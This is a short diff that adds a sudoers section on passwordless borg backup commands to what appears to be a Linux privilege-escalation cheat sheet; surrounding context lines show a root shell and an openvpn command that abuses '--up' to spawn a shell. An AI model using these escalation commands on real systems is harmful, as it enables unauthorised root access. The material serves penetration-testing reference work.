@@ -1660,6 +1660,13 @@ sudo su -
 root@WEB01:~# whoami
 root
 ````
+
+#### (ALL) NOPASSWD: /usr/bin/borg [comnmand] *
+````
+(ALL) NOPASSWD: /usr/bin/borg list *
+(ALL) NOPASSWD: /usr/bin/borg mount *
+(ALL) NOPASSWD: /usr/bin/borg extract *
+````
 #### (ALL : ALL) /usr/sbin/openvpn
 ````
 sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
